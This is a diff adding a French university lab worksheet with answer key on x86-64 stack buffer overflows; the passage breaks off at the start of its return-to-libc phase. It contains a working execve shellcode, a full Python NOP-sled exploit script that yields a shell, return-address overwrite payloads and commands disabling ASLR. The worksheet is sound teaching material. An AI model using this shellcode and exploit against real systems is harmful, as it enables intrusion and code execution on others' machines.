@@ -1,0 +1,1095 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage{fullpage}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+\usepackage{graphicx}
+\usepackage{latexsym}
+\usepackage{float}
+\usepackage{comment}
+\usepackage{array}
+\usepackage{booktabs}
+
+% --- Packages ajoutés pour l'enrichissement pédagogique ---
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{hyperref}
+
+%%%%%%%%%%%%%%% CONFIGURATION LISTINGS %%%%%%%%%%%%%%%%%%%
+
+\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codered}{rgb}{0.7,0.1,0.1}
+\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
+\definecolor{backcolour}{rgb}{0.97,0.97,0.97}
+
+\lstset{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen}\itshape,
+    keywordstyle=\color{codeblue}\bfseries,
+    stringstyle=\color{codered},
+    basicstyle=\ttfamily\small,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=8pt,
+    numberstyle=\tiny\color{codegray},
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=4,
+    frame=single,
+    rulecolor=\color{codegray},
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1
+}
+
+% Style pour le C
+\lstdefinestyle{CStyle}{
+    language=C,
+    morekeywords={void,int,char,unsigned,long,printf,gets,strcpy,strcmp,exit,strlen,system,execve},
+}
+
+% Style pour l'assembleur x86-64
+\lstdefinestyle{AsmStyle}{
+    language={[x86masm]Assembler},
+    morekeywords={xor,push,pop,mov,movabs,syscall,ret,nop,lea,sub,call,endbr64,leave,add},
+    morecomment=[l]{;},
+}
+
+% Style pour les sorties GDB/terminal
+\lstdefinestyle{GDBStyle}{
+    language={},
+    numbers=none,
+    basicstyle=\ttfamily\footnotesize,
+    backgroundcolor=\color{backcolour},
+    frame=single,
+}
+
+%%%%%%%%%%%%%%% ENVIRONNEMENTS TCOLORBOX %%%%%%%%%%%%%%%%%%
+
+% Rappel de cours (fond bleu clair)
+\newtcolorbox{rappel}[1][]{
+    colback=blue!5!white,
+    colframe=blue!50!black,
+    fonttitle=\bfseries,
+    title={\large Rappel de cours},
+    #1
+}
+
+% Point clé (fond vert clair)
+\newtcolorbox{pointcle}[1][]{
+    colback=green!5!white,
+    colframe=green!40!black,
+    fonttitle=\bfseries,
+    title={Point clé à retenir},
+    #1
+}
+
+% Attention (fond orange clair)
+\newtcolorbox{attention}[1][]{
+    colback=orange!8!white,
+    colframe=orange!60!black,
+    fonttitle=\bfseries,
+    title={Attention},
+    #1
+}
+
+% Avertissement éthique (fond rouge)
+\newtcolorbox{ethique}[1][]{
+    colback=red!5!white,
+    colframe=red!60!black,
+    fonttitle=\bfseries\large,
+    title={Avertissement éthique et légal},
+    #1
+}
+
+%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+
+\newcommand{\Ki}{\mathcal{K}}
+\newcommand{\Ci}{\mathcal{C}}
+\newcommand{\Mi}{\mathcal{M}}
+\newcommand{\Ei}{\mathcal{E}}
+\newcommand{\Di}{\mathcal{D}}
+
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+
+%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemme}
+\newtheorem{algorithme}{Algorithme}
+\newtheorem{corolaire}{Corollaire}
+\newtheorem{propriete}{Propri\'et\'e}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme}{Th\'eor\`eme}
+\newtheorem{definition}{D\'efinition}
+\newtheorem{correction}{Correction}
+%\excludecomment{correction}
+
+\theoremstyle{definition}
+\newtheorem*{probleme}{Problème}
+\newtheorem*{cout}{Coût}
+\newtheorem*{fait}{Fait}
+\newtheorem*{notation}{Notation}
+\newtheorem*{complexite}{Complexit\'e}
+\newtheorem{exercice}{Exercice}
+\newtheorem{remarque}{Remarque}
+\newtheorem{exemple}{Exemple}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue!60!black,
+    urlcolor=blue!60!black
+}
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{Université de Perpignan} \hfill  L3 Informatique \\
+ \hfill C. Legrand \hfill  Année \the\year  \\
+\smallskip
+\begin{center}
+{
+ {\scshape \large TD6 Sécurité Informatique}  \\
+ Projet StackX64 -- Exploitation progressive x86-64
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+
+\bigskip
+
+% --- Avertissement éthique ---
+\begin{ethique}
+Les techniques présentées dans ce TD sont étudiées dans un \textbf{cadre strictement académique} afin de comprendre les mécanismes d'exploitation des vulnérabilités mémoire et ainsi pouvoir mieux s'en protéger.
+
+\textbf{Toute utilisation de ces techniques en dehors du cadre pédagogique est illégale} et passible de sanctions pénales (chapitre III du Code pénal, articles 323-1 à 323-8 -- \textit{Des atteintes aux systèmes de traitement automatisé de données}) :
+\begin{itemize}
+    \item Accès ou maintien frauduleux dans un STAD (art.~323-1) : \textbf{3 ans} d'emprisonnement et \textbf{100\,000\,\texteuro{}} d'amende
+    \item Entrave au fonctionnement d'un STAD (art.~323-2) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
+    \item Introduction frauduleuse de données dans un STAD (art.~323-3) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
+\end{itemize}
+Peines portées à \textbf{7 ans} et \textbf{300\,000\,\texteuro{}} lorsque le système visé traite des données à caractère personnel mis en \oe uvre par l'État, et jusqu'à \textbf{10 ans} et \textbf{300\,000\,\texteuro{}} en bande organisée (art.~323-4-1). \textit{Peines mises à jour par la loi LOPMI n\textsuperscript{o}2023-22 du 24 janvier 2023.}
+\end{ethique}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% INTRODUCTION
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\noindent
+Dans ce TD-projet, vous allez explorer \textbf{progressivement} les techniques d'exploitation des vulnérabilités mémoire en x86-64. En partant de la reconnaissance de la pile jusqu'aux attaques avancées (shellcode, ret2libc, format strings en écriture), chaque phase approfondit la précédente et introduit une nouvelle technique d'attaque ou de défense.
+
+\medskip
+\noindent\textbf{Prérequis :} TD5 (débordement de tampon simple, modification d'adresse de retour, chaînes de format en lecture). Connaissance de base de GDB et de l'assembleur x86-64.
+
+\medskip
+\noindent\textbf{Environnement requis :} Machine Linux x86-64 (Debian 12/13 recommandé). Outils : \texttt{gcc}, \texttt{gdb}, \texttt{python3}, \texttt{objdump}, \texttt{ROPgadget} (optionnel).
+
+\bigskip
+
+\begin{attention}
+Toutes les manipulations doivent être effectuées sur une \textbf{machine virtuelle dédiée} ou un environnement isolé. Désactivez l'ASLR \textbf{uniquement} dans cet environnement :
+\begin{lstlisting}[style=GDBStyle]
+sudo sysctl -w kernel.randomize_va_space=0
+\end{lstlisting}
+\end{attention}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCICE UNIQUE : Projet StackX64
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Projet StackX64]$\;$
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 1 : Reconnaissance et cartographie mémoire (~25 min)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 1 -- Reconnaissance et cartographie mémoire \hfill\normalfont\textit{($\sim$25 min)}}
+
+\begin{rappel}
+\textbf{La pile x86-64 et les registres clés :}
+
+En architecture x86-64, la \textbf{pile} (\textit{stack}) croît vers les adresses basses. Les registres principaux sont :
+\begin{itemize}
+    \item \textbf{RSP} (\textit{Stack Pointer}) : pointe vers le sommet de la pile (dernière valeur empilée)
+    \item \textbf{RBP} (\textit{Base Pointer}) : pointe vers la base du cadre de pile de la fonction courante
+    \item \textbf{RIP} (\textit{Instruction Pointer}) : adresse de la prochaine instruction à exécuter
+\end{itemize}
+
+\medskip
+\textbf{Organisation d'un cadre de pile} lors d'un appel de fonction :
+\begin{lstlisting}[style=GDBStyle]
+Adresses hautes
++---------------------------+
+| ...                       |
+| Argument 7+ (si > 6 args)|  <-- empiles par l'appelant
++---------------------------+
+| Adresse de retour (8 o.)  |  <-- empilee par CALL
++---------------------------+
+| RBP sauvegarde (8 octets) |  <-- RBP pointe ici
++---------------------------+
+| Variables locales         |  <-- RSP pointe vers le bas
+| (buffer, etc.)            |
++---------------------------+
+Adresses basses
+\end{lstlisting}
+
+\medskip
+\textbf{Commandes GDB essentielles :}
+\begin{itemize}
+    \item \texttt{disassemble <func>} : désassembler une fonction
+    \item \texttt{info registers} : afficher les registres
+    \item \texttt{x/Nx <addr>} : examiner N mots mémoire en hexadécimal
+    \item \texttt{x/s <addr>} : examiner une chaîne de caractères
+    \item \texttt{break *<addr>} : point d'arrêt à une adresse
+    \item \texttt{run < <(python3 -c "...")} : exécuter avec une entrée générée par Python
+\end{itemize}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{1a)}] Compiler le programme \texttt{stackx64.c} avec \textbf{toutes les protections désactivées} :
+\begin{lstlisting}[style=GDBStyle]
+gcc -fno-stack-protector -no-pie -z execstack -g stackx64.c -o stackx64
+\end{lstlisting}
+Exécuter le programme avec une entrée normale (ex : \texttt{AAAA}). Observer les adresses affichées par les messages \texttt{[DEBUG]}.
+
+\item[\textbf{1b)}] Ouvrir le programme dans GDB (\texttt{gdb ./stackx64}). Désassembler la fonction \texttt{vulnerable\_function} avec \texttt{disassemble vulnerable\_function}. Identifier l'instruction \texttt{sub rsp, 0x...} qui réserve l'espace pour les variables locales. Quelle est la taille réservée ?
+
+\item[\textbf{1c)}] Placer un point d'arrêt après le \texttt{gets} dans \texttt{vulnerable\_function}. Entrer \texttt{AAAAAAAA} (8 A). Examiner la pile avec \texttt{x/20gx \$rsp}. Dessiner le schéma complet de la pile en identifiant :
+\begin{itemize}
+    \item L'adresse et le contenu du buffer
+    \item L'adresse et la valeur du RBP sauvegardé
+    \item L'adresse et la valeur de l'adresse de retour
+\end{itemize}
+
+\item[\textbf{1d)}] Calculer l'\textbf{offset} (distance en octets) entre le début du buffer et l'adresse de retour. Vérifier votre calcul avec GDB en envoyant une chaîne de taille connue et en observant l'écrasement.
+
+\item[\textbf{1e)}] Construire une entrée qui redirige l'exécution vers \texttt{secret\_function()} en écrasant l'adresse de retour. Utiliser Python3 :
+\begin{lstlisting}[style=GDBStyle]
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*?? + b'\x...\x...\x...\x...\x...\x...\x00\x00')"
+\end{lstlisting}
+Remplacer \texttt{??} par l'offset et les \texttt{\textbackslash x..} par l'adresse de \texttt{secret\_function} en \textbf{little-endian}.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{1a)} Après compilation et exécution :
+\begin{lstlisting}[style=GDBStyle]
+$ gcc -fno-stack-protector -no-pie -z execstack -g stackx64.c -o stackx64
+$ echo "AAAA" | ./stackx64
+=== StackX64 - Vulnerable Program ===
+[DEBUG] main() is at address:            0x401216
+[DEBUG] secret_function() is at address:  0x4011d6
+[DEBUG] vulnerable_function() is at:      0x4011f6
+...
+\end{lstlisting}
+
+\textbf{1b)} Désassemblage de \texttt{vulnerable\_function} :
+\begin{lstlisting}[style=GDBStyle]
+(gdb) disassemble vulnerable_function
+   ...
+   0x00000000004011fa <+4>:  push   rbp
+   0x00000000004011fb <+5>:  mov    rbp,rsp
+   0x00000000004011fe <+8>:  sub    rsp,0x40
+   ...
+\end{lstlisting}
+L'instruction \texttt{sub rsp, 0x40} réserve \textbf{64 octets} (0x40 = 64) pour les variables locales, ce qui correspond au \texttt{char buffer[64]}.
+
+\textbf{1c)} Schéma de la pile :
+\begin{lstlisting}[style=GDBStyle]
+Adresse          Contenu                 Description
+-----------      -----------------       -------------------
+0x7fffffffde58   0x0000000000401247      Adresse de retour (vers main)
+0x7fffffffde50   0x00007fffffffde70      RBP sauvegarde
+0x7fffffffde4c   0x0000000000000000      \
+0x7fffffffde48   0x0000000000000000       |
+...              ...                      | buffer[64]
+0x7fffffffde14   0x0000000000000000       |
+0x7fffffffde10   0x4141414141414141      /  <-- debut du buffer
+\end{lstlisting}
+
+\textbf{1d)} Offset = taille du buffer + RBP sauvegardé = 64 + 8 = \textbf{72 octets}.
+
+Vérification avec GDB : on envoie 72 \texttt{A} + 8 \texttt{B} et on vérifie que l'adresse de retour contient \texttt{0x4242424242424242} :
+\begin{lstlisting}[style=GDBStyle]
+(gdb) run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'B'*8)")
+(gdb) x/gx $rbp+8
+0x7fffffffde58: 0x4242424242424242
+\end{lstlisting}
+
+\textbf{1e)} L'adresse de \texttt{secret\_function} est \texttt{0x4011d6}. En little-endian :
+\begin{lstlisting}[style=GDBStyle]
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xd6\x11\x40\x00\x00\x00\x00\x00')" | ./stackx64
+=== StackX64 - Vulnerable Program ===
+...
+=============================================
+  SECRET FUNCTION REACHED!
+  You successfully redirected execution!
+=============================================
+\end{lstlisting}
+
+\begin{pointcle}
+\begin{itemize}
+    \item L'offset entre le buffer et l'adresse de retour dépend du compilateur et des options d'optimisation. Il faut \textbf{toujours vérifier avec GDB}.
+    \item En x86-64, les adresses sont sur 8 octets mais les adresses utilisateur n'utilisent que les 6 octets bas (les 2 octets hauts sont \texttt{0x00}).
+    \item L'adresse de retour est à l'adresse \texttt{RBP + 8} (juste au-dessus du RBP sauvegardé).
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 2 : Analyse et test de shellcode (~30 min)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 2 -- Analyse et test de shellcode \hfill\normalfont\textit{($\sim$30 min)}}
+
+\begin{rappel}
+\textbf{Shellcode : code machine pur}
+
+Un \textbf{shellcode} est une séquence d'octets représentant du code machine directement exécutable, conçu pour être injecté en mémoire. Son objectif classique est d'ouvrir un \textit{shell} (\texttt{/bin/sh}).
+
+\medskip
+\textbf{Conventions d'appel système x86-64 (Linux) :}
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+\textbf{Registre} & \textbf{Rôle} \\
+\midrule
+\texttt{rax} & Numéro du syscall (59 = \texttt{execve}) \\
+\texttt{rdi} & 1\textsuperscript{er} argument (\texttt{filename}) \\
+\texttt{rsi} & 2\textsuperscript{e} argument (\texttt{argv}) \\
+\texttt{rdx} & 3\textsuperscript{e} argument (\texttt{envp}) \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\medskip
+\textbf{Contrainte des null bytes :} les fonctions C de manipulation de chaînes (\texttt{strcpy}, \texttt{gets}, etc.) s'arrêtent au premier octet \texttt{0x00}. Le shellcode ne doit donc contenir \textbf{aucun octet nul}.
+\end{rappel}
+
+\medskip
+Voici un shellcode x86-64 de 25 octets qui exécute \texttt{execve("/bin//sh", NULL, NULL)} :
+
+\begin{lstlisting}[style=AsmStyle,title=Shellcode execve -- 25 octets]
+xor    rsi, rsi               ; rsi = 0 (argv = NULL)
+push   rsi                    ; empile 0 (terminateur de chaine)
+movabs rdi, 0x68732f2f6e69622f ; rdi = "/bin//sh"
+push   rdi                    ; empile "/bin//sh" sur la pile
+push   rsp                    ; empile l'adresse du sommet de pile
+pop    rdi                    ; rdi = pointeur vers "/bin//sh"
+xor    rdx, rdx               ; rdx = 0 (envp = NULL)
+mov    al, 59                 ; rax = 59 (numero syscall execve)
+syscall                       ; appel systeme execve
+\end{lstlisting}
+
+Représentation en octets :
+\begin{lstlisting}[style=GDBStyle]
+\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68
+\x57\x54\x5f\x48\x31\xd2\xb0\x3b\x0f\x05
+\end{lstlisting}
+
+\begin{enumerate}
+\item[\textbf{2a)}] Pour chaque instruction du shellcode ci-dessus, expliquer son rôle dans la construction de l'appel \texttt{execve("/bin//sh", NULL, NULL)}.
+
+\item[\textbf{2b)}] Pourquoi utilise-t-on \texttt{xor rsi, rsi} au lieu de \texttt{mov rsi, 0} pour mettre un registre à zéro ? Quel problème \texttt{mov rsi, 0} poserait-il ? (Indice : examiner les opcodes avec \texttt{objdump} ou un assembleur en ligne.)
+
+\item[\textbf{2c)}] Expliquer le concept du \textbf{NOP sled} (\texttt{0x90} = instruction \texttt{NOP}). Dessiner un schéma montrant pourquoi on pointe vers le milieu du NOP sled plutôt qu'exactement au début du shellcode.
+
+\item[\textbf{2d)}] Compiler et tester le programme \texttt{test\_shellcode.c} :
+\begin{lstlisting}[style=GDBStyle]
+gcc -z execstack -o test_shellcode test_shellcode.c
+./test_shellcode
+\end{lstlisting}
+Que se passe-t-il ? Tapez \texttt{exit} pour quitter le shell obtenu.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{2a)} Annotation instruction par instruction :
+\begin{enumerate}
+    \item \texttt{xor rsi, rsi} : met RSI à 0. RSI sera le 2\textsuperscript{e} argument de \texttt{execve} (\texttt{argv = NULL}).
+    \item \texttt{push rsi} : empile 0 sur la pile. Ce zéro servira de terminateur \texttt{\textbackslash 0} pour la chaîne.
+    \item \texttt{movabs rdi, 0x68732f2f6e69622f} : charge l'encodage ASCII de \texttt{"/bin//sh"} dans RDI (en little-endian : \texttt{2f}=\texttt{/}, \texttt{62}=\texttt{b}, \texttt{69}=\texttt{i}, \texttt{6e}=\texttt{n}, \texttt{2f}=\texttt{/}, \texttt{2f}=\texttt{/}, \texttt{73}=\texttt{s}, \texttt{68}=\texttt{h}).
+    \item \texttt{push rdi} : empile la chaîne \texttt{"/bin//sh"} sur la pile.
+    \item \texttt{push rsp} : empile l'adresse du sommet de pile (qui pointe vers \texttt{"/bin//sh"}).
+    \item \texttt{pop rdi} : RDI = adresse de la chaîne \texttt{"/bin//sh"} (1\textsuperscript{er} argument de \texttt{execve}).
+    \item \texttt{xor rdx, rdx} : met RDX à 0. RDX sera le 3\textsuperscript{e} argument de \texttt{execve} (\texttt{envp = NULL}).
+    \item \texttt{mov al, 59} : charge le numéro de syscall \texttt{execve} (59) dans AL (octet bas de RAX). On utilise AL plutôt que RAX car RAX est déjà à 0 (après \texttt{xor rsi,rsi} le CPU maintient les bits hauts à 0 suite aux opérations précédentes), et \texttt{mov al, 59} est codé sur 2 octets sans null byte.
+    \item \texttt{syscall} : déclenche l'appel système avec RAX=59, RDI=$\to$\texttt{"/bin//sh"}, RSI=0, RDX=0.
+\end{enumerate}
+
+\textbf{2b)} \texttt{mov rsi, 0} est encodé comme \texttt{48 c7 c6 \textbf{00 00 00 00}} : il contient des \textbf{octets nuls} (\texttt{0x00}). Or les fonctions comme \texttt{gets()}, \texttt{strcpy()} interprètent \texttt{0x00} comme un terminateur de chaîne et arrêtent la copie. Le shellcode serait donc \textbf{tronqué}.
+
+\texttt{xor rsi, rsi} est encodé comme \texttt{48 31 f6} (3 octets, aucun null byte) et produit le même résultat : $x \oplus x = 0$.
+
+\textbf{2c)} Le NOP sled est une zone de \texttt{NOP} (\texttt{0x90}) placée avant le shellcode :
+\begin{lstlisting}[style=GDBStyle]
++------------------------------------------+
+| NOP NOP NOP NOP ... NOP NOP | shellcode  | adresse retour |
++------------------------------------------+
+^                       ^     ^
+|                       |     |
+Debut du               Zone   Debut du
+NOP sled            d'atterr. shellcode
+
+Le RIP saute quelque part dans le NOP sled --> glisse
+jusqu'au shellcode sans erreur.
+\end{lstlisting}
+
+L'adresse exacte du buffer peut varier légèrement entre les exécutions (variables d'environnement, arguments). En pointant vers le \textbf{milieu} du NOP sled, on tolère une erreur de $\pm$(taille du sled / 2) octets.
+
+\textbf{2d)} Le programme \texttt{test\_shellcode.c} alloue le shellcode dans une variable globale (section \texttt{.data}), le caste en pointeur de fonction et l'appelle. Avec \texttt{-z execstack} (qui rend aussi les données exécutables sur certaines configurations), le shellcode s'exécute et ouvre un shell interactif \texttt{/bin/sh}.
+
+\begin{lstlisting}[style=GDBStyle]
+$ gcc -z execstack -o test_shellcode test_shellcode.c
+$ ./test_shellcode
+Shellcode length: 25 bytes
+Executing shellcode...
+$ whoami
+etudiant
+$ exit
+\end{lstlisting}
+
+\begin{pointcle}
+\begin{itemize}
+    \item Les \textbf{null bytes} (\texttt{0x00}) sont l'ennemi du shellcode : ils terminent prématurément la copie par les fonctions C standard.
+    \item Le double slash \texttt{//} dans \texttt{"/bin//sh"} est traité de manière identique à \texttt{/bin/sh} par le noyau Linux. Cette astuce permet d'obtenir une chaîne de 8 octets exactement (1 quadword).
+    \item Le NOP sled augmente la \textbf{tolérance} aux imprécisions d'adresse.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 3 : Injection de shellcode par débordement (~35 min)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 3 -- Injection de shellcode par débordement \hfill\normalfont\textit{($\sim$35 min)}}
+
+\begin{rappel}
+\textbf{Structure d'un payload d'injection de shellcode :}
+
+Le payload est construit pour tenir exactement dans l'espace buffer + RBP + adresse de retour :
+
+\begin{lstlisting}[style=GDBStyle]
++---------------------------------------------+----------+
+| NOP sled (0x90 * N) | Shellcode (25 octets)  | Addr ret |
++---------------------------------------------+----------+
+|<------------ 72 octets (offset) ----------->|<--8 o.-->|
+                                               Total: 80 octets
+\end{lstlisting}
+
+L'adresse de retour pointe vers une adresse \textbf{à l'intérieur du NOP sled} (dans le buffer).
+\end{rappel}
+
+\begin{attention}
+L'ASLR doit être \textbf{désactivé} pour cette phase. Vérifiez avec :
+\begin{lstlisting}[style=GDBStyle]
+cat /proc/sys/kernel/randomize_va_space
+\end{lstlisting}
+La valeur doit être \texttt{0}. Sinon : \texttt{sudo sysctl -w kernel.randomize\_va\_space=0}
+\end{attention}
+
+\begin{enumerate}
+\item[\textbf{3a)}] Dans GDB, trouver l'adresse exacte du buffer. Placer un point d'arrêt juste après le \texttt{gets}, exécuter avec une entrée quelconque, puis examiner l'adresse affichée par le programme ou lire le registre RSP.
+
+\item[\textbf{3b)}] Construire le payload Python3 complet :
+\begin{itemize}
+    \item \textbf{NOP sled} : 47 octets de \texttt{\textbackslash x90}
+    \item \textbf{Shellcode} : 25 octets (donné en Phase 2)
+    \item \textbf{Adresse de retour} : 8 octets pointant vers le NOP sled (en little-endian)
+    \item Total : $47 + 25 + 8 = 80$ octets
+\end{itemize}
+Écrire le script Python3 qui génère ce payload.
+
+\item[\textbf{3c)}] Exécuter l'exploit :
+\begin{lstlisting}[style=GDBStyle]
+(python3 exploit_phase3.py ; cat) | ./stackx64
+\end{lstlisting}
+Le \texttt{; cat} maintient \texttt{stdin} ouvert pour interagir avec le shell obtenu. Vérifier que vous obtenez un shell en tapant \texttt{whoami}.
+
+\item[\textbf{3d)}] Expliquer pourquoi l'adresse de retour doit être écrite en \textbf{little-endian}. Convertir l'adresse \texttt{0x7fffffffde10} en little-endian.
+\end{enumerate}
+
+\begin{attention}
+Les adresses peuvent être \textbf{différentes} entre GDB et l'exécution directe. GDB ajoute des variables d'environnement qui décalent la pile. Si l'exploit fonctionne dans GDB mais pas en dehors, ajustez l'adresse (typiquement quelques dizaines d'octets de différence).
+\end{attention}
+
+\begin{correction}
+
+\textbf{3a)} Dans GDB :
+\begin{lstlisting}[style=GDBStyle]
+(gdb) break vulnerable_function
+(gdb) run
+(gdb) disassemble
+   ...
+   0x000000000040120e <+24>:  lea    rax,[rbp-0x40]   ; buffer = rbp - 0x40
+   ...
+(gdb) next   (jusqu'apres gets)
+(gdb) print $rbp - 0x40
+$1 = (void *) 0x7fffffffde10
+\end{lstlisting}
+L'adresse du buffer est \texttt{0x7fffffffde10}.
+
+\textbf{3b)} Script Python3 pour l'exploit :
+\begin{lstlisting}[style=CStyle,language=Python,title=exploit\_phase3.py]
+import sys
+
+# Shellcode execve("/bin//sh", NULL, NULL) - 25 bytes
+shellcode = (
+    b"\x48\x31\xf6"
+    b"\x56"
+    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+    b"\x57\x54\x5f"
+    b"\x48\x31\xd2"
+    b"\xb0\x3b"
+    b"\x0f\x05"
+)
+
+offset = 72          # buffer(64) + saved RBP(8)
+nop_size = offset - len(shellcode)  # 72 - 25 = 47
+
+# Address inside the NOP sled (middle of buffer)
+# Adjust this address based on your GDB output
+ret_addr = 0x7fffffffde10 + 20  # point to middle of NOP sled
+
+nop_sled = b"\x90" * nop_size
+addr_bytes = ret_addr.to_bytes(8, byteorder='little')
+
+payload = nop_sled + shellcode + addr_bytes
+sys.stdout.buffer.write(payload)
+\end{lstlisting}
+
+\textbf{3c)} Exécution de l'exploit :
+\begin{lstlisting}[style=GDBStyle]
+$ (python3 exploit_phase3.py ; cat) | ./stackx64
+=== StackX64 - Vulnerable Program ===
+[DEBUG] main() is at address:            0x401216
+[DEBUG] secret_function() is at address:  0x4011d6
+[DEBUG] vulnerable_function() is at:      0x4011f6
+
+[DEBUG] buffer is at address: 0x7fffffffde10
+[DEBUG] Enter your input:
+[DEBUG] You entered: (garbage)
+whoami
+etudiant
+exit
+\end{lstlisting}
+
+\textbf{3d)} L'architecture x86-64 utilise l'ordre \textbf{little-endian} : l'octet de poids faible est stocké à l'adresse la plus basse.
+
+Conversion de \texttt{0x7fffffffde10} en little-endian :
+\begin{lstlisting}[style=GDBStyle]
+0x7fffffffde10 --> \x10\xde\xff\xff\xff\x7f\x00\x00
+\end{lstlisting}
+
+\begin{pointcle}
+\begin{itemize}
+    \item L'injection de shellcode donne les \textbf{mêmes privilèges} que le programme vulnérable. Si le programme est \texttt{setuid root}, l'attaquant obtient un shell root.
+    \item Le \texttt{; cat} après le script Python est essentiel : sans lui, \texttt{stdin} se ferme immédiatement et le shell ne peut pas recevoir de commandes.
+    \item Les adresses dans GDB peuvent différer de quelques octets par rapport à l'exécution directe. Le NOP sled absorbe cette différence.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 4 : Protection NX et Return-to-libc (~35 min)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 4 -- Protection NX et Return-to-libc \hfill\normalfont\textit{($\sim$35 min)}}
+
+\begin{rappel}
+\textbf{NX (No-eXecute) / DEP (Data Execution Prevention) :}
+
+La protection \textbf{NX} marque la pile (et d'autres régions de données) comme \textbf{non exécutables}. Toute tentative d'exécuter du code sur la pile provoque un signal \texttt{SIGSEGV}.
+
+\medskip
+\textbf{Return-to-libc (ret2libc) :}
+
+Au lieu d'injecter du code, on \textbf{réutilise} des fonctions déjà présentes en mémoire (dans la libc). L'appel \texttt{system("/bin/sh")} nécessite :
+\begin{enumerate}
+    \item Un \textbf{gadget} \texttt{pop rdi; ret} pour placer l'argument dans RDI
+    \item L'adresse de la chaîne \texttt{"/bin/sh"} dans la libc
+    \item L'adresse de la fonction \texttt{system()}
+\end{enumerate}
+
+\medskip
+\textbf{Alignement de pile 16 octets :}
+
+L'ABI x86-64 exige que RSP soit aligné sur 16 octets lors d'un \texttt{call}. Après un \texttt{ret} (qui dépile 8 octets), RSP n'est plus aligné. Un gadget \texttt{ret} supplémentaire réaligne la pile.
+
+\medskip
+\textbf{Structure du payload ret2libc :}
+\begin{lstlisting}[style=GDBStyle]
++--------+-----+------------+----------+----------+
+| Padding| ret | pop rdi;ret| "/bin/sh" | system() |
+| 72 o.  |8 o. | 8 octets   | 8 octets | 8 octets |
++--------+-----+------------+----------+----------+
+           ^       ^             ^          ^
+           |       |             |          |
+         align   gadget     argument    fonction
+\end{lstlisting}
+\end{rappel}
+
+\begin{enumerate}
